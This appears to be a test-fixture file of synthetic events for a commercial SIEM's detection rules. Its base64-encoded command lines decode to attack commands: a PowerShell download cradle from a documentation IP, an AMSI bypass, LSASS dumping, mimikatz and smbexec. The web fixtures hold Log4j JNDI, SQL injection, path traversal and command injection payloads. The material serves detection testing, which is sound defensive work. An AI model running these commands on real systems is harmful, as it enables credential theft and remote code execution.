// Copyright (c) 2026 Citynet Work and Zyberon Information Technology, Saudi Arabia. All rights reserved. Proprietary and confidential - see LICENSE.
'use strict';
const ZYB_ORG = require('../engine/util/brand');
// CLEARLY LABELLED SYNTHETIC TEST EVENTS — used only by tests/detect-rules.test.js (never shipped as data).
// One entry per built-in real-time rule: every `pos` list must make the rule alert, every `neg` list must not.
// Field names follow the core parsers (engine/parse/*.js); a few positives use raw vendor names to prove the fallbacks.
// Timestamps: T0 = Tue 2026-09-29 13:00 Asia/Riyadh (business hours); NIGHT = same day 23:00; FRIDAY = Fri 2026-10-02 13:00.
// Attack-tool command lines are stored base64-encoded (X.*) so endpoint antivirus does not quarantine this test file;
// '~' stands for a backslash inside the encoded strings.

const T0 = Date.UTC(2026, 8, 29, 10, 0, 0);
const NIGHT = Date.UTC(2026, 8, 29, 20, 0, 0);
const FRIDAY = Date.UTC(2026, 9, 2, 10, 0, 0);
const DAY = 86400000;

const d = (b) => Buffer.from(b, 'base64').toString('utf8').replace(/~/g, '\\');
const X = {
  enc: d('cG93ZXJzaGVsbC5leGUgLU5vUCAtTm9uSSAtVyBIaWRkZW4gLWVuYyBTUUJGQUZnQUlBQW9BRTRBWlFCM0FDMEFUd0JpQUdvQVpRQmpBSFFBSUFCT0FHVUFkQUF1QUZjQVpRQmlBRU1BYkFCcEFHVUFiZ0IwQUNrQQ=='),
  encNeg: d('Y21kLmV4ZSAvYyBlY2hvIC1lbmMgU1FCRkFGZ0FJQUFvQUU0QVpRQjNBQzBBVHdCaUFHb0FaUUJqQUhRQQ=='),
  cradle: d('cG93ZXJzaGVsbCAtYyAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMjAzLjAuMTEzLjUvYS5wczEnKSI='),
  iwr: d('SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwczovLzIwMy4wLjExMy41L3AuZXhlIC1PdXRGaWxlICRlbnY6VEVNUH5wLmV4ZQ=='),
  bits: d('U3RhcnQtQml0c1RyYW5zZmVyIC1Tb3VyY2UgaHR0cHM6Ly8yMDMuMC4xMTMuNS94IC1EZXN0aW5hdGlvbiB4'),
  amsi: d('W1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgnU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHMnKS5HZXRGaWVsZCgnYW1zaUluaXRGYWlsZWQnLCdOb25QdWJsaWMsU3RhdGljJykuU2V0VmFsdWUoJG51bGwsJHRydWUp'),
  comsvcs: d('cnVuZGxsMzIuZXhlIEM6fndpbmRvd3N+U3lzdGVtMzJ+Y29tc3Zjcy5kbGwsIE1pbmlEdW1wIDYyNCBDOn50ZW1wfm91dC5kbXAgZnVsbA=='),
  procdump: d('cHJvY2R1bXA2NC5leGUgLWFjY2VwdGV1bGEgLW1hIGxzYXNzLmV4ZSBsc2Fzcy5kbXA='),
  mimi: d('bWltaWthdHouZXhlICJwcml2aWxlZ2U6OmRlYnVnIiAic2VrdXJsc2E6OmxvZ29ucGFzc3dvcmRzIiBleGl0'),
  smbexec: d('JUNPTVNQRUMlIC9RIC9jIGVjaG8gY2QgIF4+IH5+MTI3LjAuMC4xfkMkfl9fb3V0cHV0IDJePl4mMSA+ICVURU1QJX5leGVjdXRlLmJhdA=='),
  jndi: d('L2FwaT9xPSR7am5kaTpsZGFwOi8vMjAzLjAuMTEzLjkvYX0='),
};

let seq = 0;
function ev(o = {}) {
  seq++;
  const base = {
    id: `synthetic-${seq}`, ts: T0, rts: T0, src_type: 'windows', src_id: 'synthetic-src', collector: 'agent', host: 'synthetic-host',
    host_ip: '10.0.0.1', category: 'other', action: '', outcome: 'unknown', severity: 0, user: '', target_user: '', domain: '',
    src_ip: '', dst_ip: '', src_port: 0, dst_port: 0, proto: '', process: '', parent_process: '', cmdline: '', hash: '',
    url: '', http_method: '', http_status: 0, user_agent: '', dns_query: '', event_code: '', message: 'SYNTHETIC TEST EVENT',
    tags: ['synthetic-test'], fields: {}, raw: 'SYNTHETIC TEST EVENT',
  };
  const e = Object.assign(base, o);
  e.fields = Object.assign({}, o.fields || {});
  return e;
}
const times = (n, fn) => Array.from({ length: n }, (_, i) => fn(i));

// Intel lists used by the INTEL rules (loaded into a createIntel() instance via add()).
const INTEL = {
  domains: ['evil-domain.example', 'bad-phish.example'],
  ips: ['198.51.100.64/26', '203.0.113.250'],
  hashes: ['e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', '44d88612fea8a8f36de82e1278abb02f'],
};

const win = (o) => ev(Object.assign({ src_type: 'windows' }, o));
const lnx = (o) => ev(Object.assign({ src_type: 'linux', host: 'web01' }, o));
const fgt = (o) => ev(Object.assign({ src_type: 'fortigate', host: 'fw-hq-01', category: 'network' }, o));
const web = (o) => ev(Object.assign({ src_type: 'nginx', host: 'www01', category: 'web', action: 'http-request', http_method: 'GET', http_status: 200, src_ip: '203.0.113.50' }, o));
const m365 = (o) => ev(Object.assign({ src_type: 'm365', host: 'entra-id', category: 'cloud' }, o));
const proc = (cmdline, o) => win(Object.assign({ event_code: '4688', action: 'process-start', category: 'process', cmdline, process: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', user: 'bob' }, o));
const script = (text, o) => win(Object.assign({ event_code: '4104', action: 'script-block', category: 'process', process: 'powershell', cmdline: text, user: 'bob' }, o));
const sshFail = (o) => lnx(Object.assign({ action: 'logon-failed', outcome: 'failure', category: 'authentication', process: 'sshd', fields: { service: 'ssh', auth_method: 'password' } }, o));
const kerbTgs = (o, f) => win({ event_code: '4769', action: 'kerberos-service-ticket', outcome: 'success', category: 'authentication', user: 'alice', src_ip: '10.1.1.8', ...o, fields: { auth_protocol: 'kerberos', ...f } });

const F = {
  'SENTRA-AUTH-001': {
    pos: times(10, (i) => win({ ts: T0 + i * 10000, event_code: '4625', action: 'logon-failed', outcome: 'failure', user: 'alice', src_ip: '10.1.1.5' })),
    neg: [
      ...times(9, (i) => win({ ts: T0 + i * 10000, event_code: '4625', action: 'logon-failed', user: 'alice' })),
      ...times(10, (i) => win({ ts: T0 + i * 10000, event_code: '4625', action: 'logon-failed', user: 'pc01$' })),
      ...times(10, (i) => win({ ts: T0 + i * 60000, event_code: '4625', action: 'logon-failed', user: 'carol' })), // spread over 9 min > 5 min window
    ],
  },
  'SENTRA-AUTH-002': {
    pos: times(10, (i) => win({ ts: T0 + i * 5000, action: 'logon-failed', user: `user${i}`, src_ip: '203.0.113.9' })),
    neg: [
      ...times(10, (i) => win({ ts: T0 + i * 5000, action: 'logon-failed', user: 'same', src_ip: '203.0.113.9' })),
      ...times(9, (i) => win({ ts: T0 + i * 5000, action: 'logon-failed', user: `other${i}`, src_ip: '203.0.113.10' })),
    ],
  },
  'SENTRA-AUTH-003': {
    pos: [...times(5, (i) => win({ ts: T0 + i * 1000, action: 'logon-failed', user: 'bob' })), win({ ts: T0 + 10000, action: 'logon', outcome: 'success', user: 'bob' })],
    neg: [
      ...times(4, (i) => win({ ts: T0 + i * 1000, action: 'logon-failed', user: 'bob' })), win({ ts: T0 + 10000, action: 'logon', outcome: 'success', user: 'bob' }),
      ...times(5, (i) => win({ ts: T0 + i * 1000, action: 'logon-failed', user: 'carol' })), win({ ts: T0 + 10000, action: 'logon', outcome: 'success', user: 'dave' }),
      ...times(5, (i) => win({ ts: T0 + i * 1000, action: 'logon-failed', user: 'erin' })), win({ ts: T0 + 3600000, action: 'logon', outcome: 'success', user: 'erin' }),
    ],
  },
  'SENTRA-AUTH-004': {
    pos: [
      win({ event_code: '4625', action: 'logon-failed', user: 'olduser', fields: { status: '0xc000006e', sub_status: '0xc0000072', failure_reason: 'account disabled' } }),
      win({ event_code: '4625', action: 'logon-failed', user: 'locked1', fields: { Status: '0xC000006E', SubStatus: '0xC0000234' } }), // raw vendor names
    ],
    neg: [win({ event_code: '4625', action: 'logon-failed', user: 'alice', fields: { status: '0xc000006d', sub_status: '0xc000006a', failure_reason: 'bad password' } })],
  },
  'SENTRA-AUTH-005': {
    pos: [win({ event_code: '4740', action: 'account-locked', category: 'iam', user: 'dc01$', target_user: 'alice' })],
    neg: [win({ event_code: '4625', action: 'logon-failed', user: 'alice' })],
  },
  'SENTRA-AUTH-006': {
    pos: [win({ event_code: '4624', action: 'logon', outcome: 'success', user: 'administrator', src_ip: '198.51.100.20', tags: ['rdp'], fields: { logon_type: '10', logon_type_name: 'remote-interactive' } })],
    neg: [
      win({ event_code: '4624', action: 'logon', outcome: 'success', user: 'administrator', src_ip: '10.2.3.4', fields: { logon_type: '10' } }),
      win({ event_code: '4624', action: 'logon', outcome: 'success', user: 'administrator', src_ip: '198.51.100.20', fields: { logon_type: '3' } }),
      win({ event_code: '4624', action: 'logon', outcome: 'success', user: 'administrator', src_ip: '', fields: { logon_type: '10' } }),
    ],
  },
  'SENTRA-AUTH-007': {
    pos: [
      win({ ts: NIGHT, event_code: '4624', action: 'logon', outcome: 'success', user: 'adm-syed', fields: { logon_type: '2' } }),
      lnx({ ts: FRIDAY, action: 'logon', outcome: 'success', user: 'ops', tags: ['admin'], host: 'db01' }),
    ],
    neg: [
      win({ ts: T0, event_code: '4624', action: 'logon', outcome: 'success', user: 'adm-syed', fields: { logon_type: '2' } }),
      win({ ts: NIGHT, event_code: '4624', action: 'logon', outcome: 'success', user: 'alice', fields: { logon_type: '2' } }),
      win({ ts: NIGHT, event_code: '4624', action: 'logon', outcome: 'success', user: 'adm-syed', fields: { logon_type: '3' } }),
    ],
  },
  'SENTRA-IAM-001': {
    pos: [win({ event_code: '4732', action: 'group-member-added', category: 'iam', user: 'helpdesk1', target_user: 'mallory', fields: { group: 'Administrators', group_domain: 'BUILTIN', TargetSid: 'S-1-5-32-544' } })],
    neg: [win({ event_code: '4732', action: 'group-member-added', category: 'iam', user: 'helpdesk1', target_user: 'mallory', fields: { group: 'Finance-Share-RW', TargetSid: 'S-1-5-21-1-2-3-1234' } })],
  },
  'SENTRA-IAM-002': {
    pos: [lnx({ action: 'group-member-added', category: 'iam', target_user: 'bob', fields: { group: 'wheel' } })],
    neg: [lnx({ action: 'user-created', category: 'iam', target_user: 'bob' })],
  },
  'SENTRA-IAM-003': {
    pos: [win({ ts: T0, event_code: '4720', action: 'user-created', user: 'admin1', target_user: 'svc-new' }), win({ ts: T0 + 2000, event_code: '4722', action: 'user-enabled', user: 'admin1', target_user: 'svc-new' })],
    neg: [win({ ts: T0, event_code: '4720', action: 'user-created', target_user: 'x-user' }), win({ ts: T0 + 2000, event_code: '4722', action: 'user-enabled', target_user: 'y-user' })],
  },
  'SENTRA-IAM-004': {
    pos: [lnx({ action: 'user-created', category: 'iam', target_user: 'backdoor', fields: { uid: '1337' } })],
    neg: [lnx({ action: 'group-member-added', category: 'iam', target_user: 'bob' })],
  },
  'SENTRA-SYS-001': {
    pos: [win({ event_code: '1102', action: 'audit-log-cleared', user: 'mallory', host: 'dc01' })],
    neg: [lnx({ event_code: '104' }), win({ event_code: '1100', action: 'event' })],
  },
  'SENTRA-SYS-002': {
    pos: [win({ event_code: '7045', action: 'service-installed', cmdline: 'C:\\Program Files\\Upd\\upd.exe', fields: { service_name: 'UpdSvc' } })],
    neg: [win({ event_code: '7036', action: 'event', fields: { param1: 'Spooler' } })],
  },
  'SENTRA-SYS-003': {
    pos: [win({ event_code: '7045', action: 'service-installed', cmdline: X.smbexec, fields: { service_name: 'BTOBTO' } })],
    neg: [win({ event_code: '7045', action: 'service-installed', cmdline: '"C:\\Program Files\\Vendor\\agent.exe" -service', fields: { service_name: 'VendorAgent' } })],
  },
  'SENTRA-SYS-004': {
    pos: [
      win({ event_code: '4698', action: 'scheduled-task-created', cmdline: 'C:\\Users\\Public\\u.exe', fields: { task_name: '\\Updater' } }),
      proc('schtasks.exe /Create /SC ONLOGON /TN upd /TR c:\\users\\public\\x.exe', { process: 'C:\\Windows\\System32\\schtasks.exe', host: 'pc7' }),
    ],
    neg: [proc('schtasks /query /fo LIST', { process: 'C:\\Windows\\System32\\schtasks.exe' })],
  },
  'SENTRA-EXEC-001': {
    pos: [proc(X.enc)],
    neg: [proc('powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1'), proc(X.encNeg, { process: 'C:\\Windows\\System32\\cmd.exe' })],
  },
  'SENTRA-EXEC-002': {
    pos: [
      proc(X.cradle),
      script(X.iwr, { host: 'pc9' }),
      win({ event_code: '4104', host: 'pc10', fields: { ScriptBlockText: X.bits } }), // raw vendor name
    ],
    neg: [proc('powershell Get-ChildItem C:\\ -Recurse'), script('Get-Service | Where-Object Status -eq Running')],
  },
  'SENTRA-EXEC-003': {
    pos: [script(X.amsi)],
    neg: [script('Get-Process | Sort-Object CPU')],
  },
  'SENTRA-CRED-001': {
    pos: [
      proc(X.comsvcs, { process: 'C:\\Windows\\System32\\rundll32.exe' }),
      proc(X.procdump, { process: 'C:\\Tools\\pd64.exe', host: 'srv2' }),
    ],
    neg: [proc('procdump.exe -ma w3wp.exe w3wp.dmp', { process: 'C:\\Tools\\procdump.exe' })],
  },
  'SENTRA-CRED-002': {
    pos: [proc(X.mimi, { process: 'C:\\Users\\bob\\Downloads\\m.exe' })],
    neg: [proc('notepad.exe C:\\notes\\kerberos.txt', { process: 'C:\\Windows\\notepad.exe' })],
  },
  'SENTRA-CRED-003': {
    pos: [win({ event_code: '10', category: 'process', fields: { SourceImage: 'C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1010' } })],
    neg: [
      win({ event_code: '10', category: 'process', fields: { SourceImage: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18\\MsMpEng.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1010' } }),
      win({ event_code: '10', category: 'process', fields: { SourceImage: 'C:\\Users\\bob\\AppData\\Local\\Temp\\x.exe', TargetImage: 'C:\\Windows\\system32\\lsass.exe', GrantedAccess: '0x1000' } }),
    ],
  },
  'SENTRA-CRED-004': {
    pos: [
      kerbTgs({}, { service_name: 'MSSQLSvc-prod', ticket_encryption: '0x17' }),
      win({ event_code: '4769', user: 'bob', fields: { ServiceName: 'HTTP-intranet', TicketEncryptionType: '0x17', Status: '0x0' } }), // raw vendor names
    ],
    neg: [
      kerbTgs({}, { service_name: 'DC01$', ticket_encryption: '0x17' }),
      kerbTgs({}, { service_name: 'MSSQLSvc-prod', ticket_encryption: '0x12' }),
      kerbTgs({ outcome: 'failure' }, { service_name: 'MSSQLSvc-prod', ticket_encryption: '0x17', status: '0x1b' }),
    ],
  },
  'SENTRA-CRED-005': {
    pos: times(5, (i) => kerbTgs({ ts: T0 + i * 1000 }, { service_name: `svc${i}`, ticket_encryption: '0x17' })),
    neg: times(8, (i) => kerbTgs({ ts: T0 + i * 1000 }, { service_name: `svc${i % 4}`, ticket_encryption: '0x17' })),
  },
  'SENTRA-CRED-006': {
    pos: [win({ event_code: '4768', action: 'kerberos-tgt', outcome: 'success', user: 'svc-legacy', src_ip: '10.1.1.9', tags: ['T1558.004'], fields: { preauth_type: '0', ticket_encryption: '0x17' } })],
    neg: [
      win({ event_code: '4768', action: 'kerberos-tgt', outcome: 'success', user: 'alice', fields: { preauth_type: '2', ticket_encryption: '0x12' } }),
      win({ event_code: '4768', action: 'logon-failed', outcome: 'failure', user: 'svc-legacy', fields: { preauth_type: '0', status: '0x12' } }),
    ],
  },
  'SENTRA-LNX-001': {
    pos: times(20, (i) => sshFail({ ts: T0 + i * 2000, user: `u${i % 3}`, src_ip: '198.51.100.7' })),
    neg: [
      ...times(19, (i) => sshFail({ ts: T0 + i * 2000, user: 'root', src_ip: '198.51.100.8' })),
      ...times(20, (i) => lnx({ ts: T0 + i * 2000, action: 'logon-failed', process: 'login', user: 'root', src_ip: '198.51.100.9' })),
    ],
  },
  'SENTRA-LNX-002': {
    pos: [lnx({ action: 'logon', outcome: 'success', category: 'authentication', process: 'sshd', user: 'root', src_ip: '10.0.0.9', fields: { service: 'ssh', auth_method: 'publickey' } })],
    neg: [lnx({ action: 'logon', outcome: 'success', category: 'authentication', process: 'sshd', user: 'deploy', src_ip: '10.0.0.9', fields: { service: 'ssh' } })],
  },
  'SENTRA-LNX-003': {
    pos: [
      lnx({ action: 'sudo', outcome: 'success', category: 'process', user: 'alice', target_user: 'root', cmdline: '/bin/bash', process: '/bin/bash' }),
      lnx({ action: 'sudo', outcome: 'success', category: 'process', user: 'bob', target_user: 'root', cmdline: '/usr/bin/su -', process: '/usr/bin/su' }),
    ],
    neg: [
      lnx({ action: 'sudo', outcome: 'success', user: 'alice', target_user: 'root', cmdline: '/usr/bin/systemctl restart nginx' }),
      lnx({ action: 'sudo', outcome: 'failure', user: 'alice', target_user: 'root', cmdline: '/bin/bash' }),
      lnx({ action: 'sudo', outcome: 'success', user: 'alice', target_user: 'postgres', cmdline: '/bin/bash' }),
    ],
  },
  'SENTRA-LNX-004': {
    pos: times(3, (i) => lnx({ ts: T0 + i * 5000, action: 'sudo', outcome: 'failure', user: 'alice', cmdline: '/bin/cat /etc/shadow', fields: { reason: 'incorrect password attempt' } })),
    neg: times(2, (i) => lnx({ ts: T0 + i * 5000, action: 'sudo', outcome: 'failure', user: 'alice' })),
  },
  'SENTRA-WEB-001': {
    pos: times(50, (i) => web({ ts: T0 + i * 1000, http_status: 404, url: `/admin${i}.php` })),
    neg: [...times(49, (i) => web({ ts: T0 + i * 1000, http_status: 404, url: `/x${i}` })), ...times(60, (i) => web({ ts: T0 + i * 1000, src_ip: '203.0.113.51', http_status: 200, url: `/p${i}` }))],
  },
  'SENTRA-WEB-002': {
    pos: [web({ url: '/products.php?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--' }), web({ url: "/login?user=admin'--", src_ip: '203.0.113.52' })],
    neg: [web({ url: '/products.php?id=12&sort=name' }), web({ url: '/blog/union-select-committee-report' }), web({ url: '/search?q=orange+and+apple' })],
  },
  'SENTRA-WEB-003': {
    pos: [web({ url: '/download?file=../../../../etc/passwd' }), web({ url: '/static/%2e%2e%2f%2e%2e%2fwindows/win.ini', src_ip: '203.0.113.53' })],
    neg: [web({ url: '/docs/v1.2/guide.html' }), web({ url: '/files/a..b.txt' })],
  },
  'SENTRA-WEB-004': {
    pos: [web({ url: '/ping?host=127.0.0.1;cat%20/etc/shadow' }), web({ url: X.jndi, src_ip: '203.0.113.54' })],
    neg: [web({ url: '/search?q=cats&dogs=1' }), web({ url: '/app;jsessionid=ABC123' })],
  },
  'SENTRA-WEB-005': {
    pos: [web({ user_agent: 'sqlmap/1.7.2#stable (https://sqlmap.org)' })],
    neg: [web({ user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126.0 Safari/537.36' })],
  },
  'SENTRA-FGT-001': {
    pos: [fgt({ event_code: '0419016384', action: 'ips-detection', severity: 4, src_ip: '203.0.113.77', dst_ip: '10.0.5.10', fields: { type: 'utm', subtype: 'ips', severity: 'critical', attack: 'Apache.Log4j.Error.Log.Remote.Code.Execution' } })],
    neg: [fgt({ event_code: '0419016384', action: 'ips-detection', severity: 1, src_ip: '203.0.113.77', fields: { type: 'utm', subtype: 'ips', severity: 'low', attack: 'HTTP.URI.SQL.Injection' } })],
  },
  'SENTRA-FGT-002': {
    pos: [fgt({ event_code: '0211008192', action: 'av-detection', category: 'malware', severity: 3, src_ip: '10.0.5.22', url: '203.0.113.8/test-file.com', fields: { subtype: 'virus', virus: 'EICAR_TEST_FILE' } })],
    neg: [fgt({ action: 'blocked', src_ip: '10.0.5.22' })],
  },
  'SENTRA-FGT-003': {
    pos: times(200, (i) => fgt({ ts: T0 + i * 1000, action: 'blocked', outcome: 'failure', src_ip: '10.10.5.5', dst_ip: `10.20.${i % 5}.${i % 250}`, dst_port: 445 })),
    neg: [
      ...times(199, (i) => fgt({ ts: T0 + i * 1000, action: 'blocked', src_ip: '10.10.5.5', dst_ip: '10.20.0.1', dst_port: 445 })),
      ...times(200, (i) => fgt({ ts: T0 + i * 1000, action: 'blocked', src_ip: '198.51.100.99', dst_ip: '10.0.0.10', dst_port: 22 })),
    ],
  },
  'SENTRA-FGT-004': {
    pos: times(50, (i) => fgt({ ts: T0 + i * 1000, action: 'blocked', src_ip: '10.10.5.6', dst_ip: `10.30.1.${i + 1}`, dst_port: 3389 })),
    neg: times(100, (i) => fgt({ ts: T0 + i * 1000, action: 'blocked', src_ip: '10.10.5.6', dst_ip: `10.30.1.${(i % 49) + 1}`, dst_port: 3389 })),
  },
  'SENTRA-FGT-005': {
    pos: times(10, (i) => fgt({ ts: T0 + i * 3000, event_code: '0101039426', category: 'authentication', action: 'logon-failed', user: `vpnuser${i}`, src_ip: '203.0.113.99', tags: ['vpn'], fields: { subtype: 'vpn', action: 'ssl-login-fail', reason: 'sslvpn_login_permission_denied' } })),
    neg: [
      ...times(9, (i) => fgt({ ts: T0 + i * 3000, event_code: '0101039426', action: 'logon-failed', src_ip: '203.0.113.99', fields: { subtype: 'vpn', action: 'ssl-login-fail' } })),
      ...times(10, (i) => fgt({ ts: T0 + i * 3000, event_code: '0101039424', action: 'logon', src_ip: '203.0.113.98', fields: { subtype: 'vpn', action: 'tunnel-up' } })),
    ],
  },
  'SENTRA-FGT-006': {
    pos: [
      fgt({ ts: T0, event_code: '0100032001', category: 'authentication', action: 'logon', outcome: 'success', user: 'fgadmin', src_ip: '10.0.0.5', fields: { subtype: 'system', action: 'login', status: 'success', ui: 'https(10.0.0.5)' } }),
      fgt({ ts: T0 + 8 * DAY, event_code: '0100032001', category: 'authentication', action: 'logon', outcome: 'success', user: 'fgadmin', src_ip: '10.0.0.66', fields: { subtype: 'system', action: 'login', status: 'success', ui: 'https(10.0.0.66)' } }),
    ],
    neg: [
      fgt({ ts: T0, event_code: '0100032001', action: 'logon', user: 'fgadmin', src_ip: '10.0.0.5', fields: { subtype: 'system', action: 'login', status: 'success' } }),
      fgt({ ts: T0 + DAY, event_code: '0100032001', action: 'logon', user: 'fgadmin', src_ip: '10.0.0.77', fields: { subtype: 'system', action: 'login', status: 'success' } }),
      fgt({ ts: T0 + 8 * DAY, event_code: '0100032001', action: 'logon', user: 'fgadmin', src_ip: '10.0.0.5', fields: { subtype: 'system', action: 'login', status: 'success' } }),
      fgt({ ts: T0 + 9 * DAY, event_code: '0100032002', action: 'logon-failed', user: 'fgadmin', src_ip: '10.0.0.99', fields: { subtype: 'system', action: 'login', status: 'failed' } }),
    ],
  },
  'SENTRA-EXFIL-001': {
    pos: times(3, (i) => fgt({ ts: T0 + i * 600000, action: 'allowed', src_ip: '10.1.2.3', dst_ip: '198.51.100.200', dst_port: 443, fields: { sentbyte: String(400 * 1024 * 1024) } })),
    neg: [
      ...times(2, (i) => fgt({ ts: T0 + i * 600000, action: 'allowed', src_ip: '10.1.2.3', dst_ip: '198.51.100.201', fields: { sentbyte: String(400 * 1024 * 1024) } })),
      ...times(3, (i) => fgt({ ts: T0 + i * 600000, action: 'allowed', src_ip: '10.1.2.3', dst_ip: '10.9.9.9', fields: { sentbyte: String(400 * 1024 * 1024) } })),
      ...times(3, (i) => fgt({ ts: T0 + i * 3 * 3600000, action: 'allowed', src_ip: '10.1.2.4', dst_ip: '198.51.100.202', fields: { sentbyte: String(400 * 1024 * 1024) } })),
    ],
  },
  'SENTRA-INTEL-001': {
    pos: [win({ category: 'dns', action: 'dns-query', event_code: '22', src_ip: '10.0.0.40', dns_query: 'cdn.evil-domain.example' })],
    neg: [win({ category: 'dns', action: 'dns-query', event_code: '22', src_ip: '10.0.0.40', dns_query: 'www.example.com' }), win({ dns_query: 'notevil-domain.example' })],
  },
  'SENTRA-INTEL-002': {
    pos: [fgt({ action: 'allowed', src_ip: '10.0.0.41', dst_ip: '198.51.100.66', dst_port: 443 })],
    neg: [fgt({ action: 'allowed', src_ip: '10.0.0.41', dst_ip: '8.8.8.8', dst_port: 53 })],
  },
  'SENTRA-INTEL-003': {
    pos: [win({ event_code: '1', action: 'process-start', process: 'C:\\x\\bad.exe', hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855' }),
      win({ event_code: '1', action: 'process-start', host: 'pc2', process: 'C:\\x\\bad2.exe', hash: 'SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,MD5=44D88612FEA8A8F36DE82E1278ABB02F' })],
    neg: [win({ event_code: '1', action: 'process-start', process: 'C:\\x\\good.exe', hash: '0000000000000000000000000000000000000000000000000000000000000001' })],
  },
  'SENTRA-INTEL-004': {
    pos: [fgt({ category: 'web', action: 'allowed', src_ip: '10.0.0.42', url: 'login.bad-phish.example/owa/auth.aspx', fields: { subtype: 'webfilter', hostname: 'login.bad-phish.example' } })],
    neg: [fgt({ category: 'web', action: 'allowed', src_ip: '10.0.0.42', url: 'portal.office.com/', fields: { subtype: 'webfilter', hostname: 'portal.office.com' } })],
  },
  'SENTRA-M365-001': {
    pos: [m365({ category: 'authentication', action: 'logon', outcome: 'success', event_code: '0', user: 'cfo@example.sa', src_ip: '203.0.113.30', tags: ['risky-signin'], fields: { m365_type: 'signin', risk_level: 'high', risk_state: 'atRisk' } })],
    neg: [m365({ category: 'authentication', action: 'logon', outcome: 'success', event_code: '0', user: 'cfo@example.sa', fields: { m365_type: 'signin', risk_level: 'none', risk_state: 'none' } })],
  },
  'SENTRA-M365-002': {
    pos: times(5, (i) => m365({ ts: T0 + i * 60000, category: 'authentication', action: 'logon-failed', outcome: 'failure', event_code: '500121', user: 'ceo@example.sa', fields: { m365_type: 'signin', failure_reason: 'Authentication failed during strong authentication request.' } })),
    neg: [
      ...times(4, (i) => m365({ ts: T0 + i * 60000, action: 'logon-failed', event_code: '500121', user: 'ceo@example.sa' })),
      ...times(5, (i) => m365({ ts: T0 + i * 60000, action: 'logon-failed', event_code: '50126', user: 'hr@example.sa' })),
    ],
  },
  'SENTRA-M365-004': {
    pos: times(5, (i) => m365({ ts: T0 + i * 60000, category: 'cloud', event_code: 'Set-Mailbox', host: 'exchange', user: `u${i}@example.sa`, fields: { Parameters: `[{"Name":"ForwardingSmtpAddress","Value":"smtp:x${i}@example.net"}]` } })),
    neg: times(4, (i) => m365({ ts: T0 + i * 60000, category: 'cloud', event_code: 'Set-Mailbox', host: 'exchange', user: `u${i}@example.sa`, fields: { Parameters: `[{"Name":"ForwardingSmtpAddress","Value":"smtp:x${i}@example.net"}]` } })),
  },
};

// the SIEM pipeline canary (engine/ops/canary.js): its own labelled test line - never a look-alike from a real device
F['SENTRA-OPS-900'] = {
  pos: [ev({ host: 'siem-canary', event_code: 'ZYB-CANARY', src_type: 'json', message: (ZYB_ORG.short + ' SIEM pipeline canary CNY-SYN1'), fields: { canary_run: 'CNY-SYN1' } })],
  neg: [ev({ host: 'pc-syn-1', event_code: 'ZYB-CANARY', src_type: 'json', fields: { canary_run: 'CNY-SYN2' } }), ev({ host: 'siem-canary', event_code: '4624', src_type: 'windows' })],
};
module.exports = { FIXTURES: F, INTEL, ev, T0, NIGHT, FRIDAY, DAY, X };

// GoldenGate integrated Extract / Replicat readings (platform Oracle connection, oracle-tuning.sql)
const gg = (o, f) => ev(Object.assign({ src_type: 'oracle-health', host: 'eskauat', category: 'database', tags: ['synthetic-test', 'oracle', 'db-health', 'db-perf'] }, o, { fields: Object.assign({ instance: 'ESS', db_name: 'ESS' }, f) }));
F['SENTRA-ORAP-020'] = {
  pos: [gg({ action: 'gg-apply', severity: 4 }, { key: 'RPROD', status: 'ABORTED' }), gg({ action: 'gg-capture', severity: 4 }, { key: 'EPROD', status: 'ENABLED', error: 'ORA-01291: missing logfile' })],
  neg: [gg({ action: 'gg-apply' }, { key: 'RPROD', status: 'ENABLED', state: 'IDLE', lag_s: '4' }), gg({ action: 'long-query' }, { status: 'ABORTED' })],
};
F['SENTRA-ORAP-021'] = {
  pos: [gg({ action: 'gg-apply', severity: 3 }, { key: 'RPROD', status: 'ENABLED', lag_s: '2400' })],
  neg: [gg({ action: 'gg-apply', severity: 2 }, { key: 'RPROD', status: 'ENABLED', lag_s: '600' }), gg({ action: 'gg-capture' }, { key: 'EPROD', status: 'ENABLED', lag_s: '30' })],
};

F['SENTRA-ORAP-030'] = {
  pos: [gg({ action: 'dg-transport', severity: 4 }, { key: 'ESS_DR', status: 'ERROR', error: 'ORA-12541: TNS:no listener' }), gg({ action: 'dg-transport', severity: 3 }, { key: 'ESS_DR', status: 'VALID', gap_status: 'RESOLVABLE GAP' }),
    gg({ action: 'dg-transport', severity: 3 }, { key: 'ESS_DR', status: 'VALID', gap_status: 'NO GAP', recovery_mode: 'IDLE' })],
  neg: [gg({ action: 'dg-transport' }, { key: 'ESS_DR', status: 'VALID', gap_status: 'NO GAP', recovery_mode: 'MANAGED REAL TIME APPLY' }), gg({ action: 'archive-dest' }, { status: 'ERROR' })],
};
F['SENTRA-ORAP-031'] = {
  pos: [gg({ action: 'dg-apply-lag', severity: 3 }, { key: '2:1', unapplied: '6', unapplied_since_s: '2400' }), gg({ action: 'dg-lag', severity: 3 }, { key: 'apply lag', name: 'apply lag', value: '+00 00:45:00', value_s: '2700' })],
  neg: [gg({ action: 'dg-apply-lag' }, { key: '2:1', unapplied: '0', unapplied_since_s: '0' }), gg({ action: 'dg-lag', severity: 2 }, { key: 'apply lag', value_s: '600' })],
};
F['SENTRA-ORAP-032'] = {
  pos: [gg({ action: 'dg-process', severity: 4 }, { role: 'PHYSICAL STANDBY', mrp: '0', rfs: '2' }), gg({ action: 'dg-gap', severity: 4 }, { key: '1', thread: '1', low_seq: '880', high_seq: '884' })],
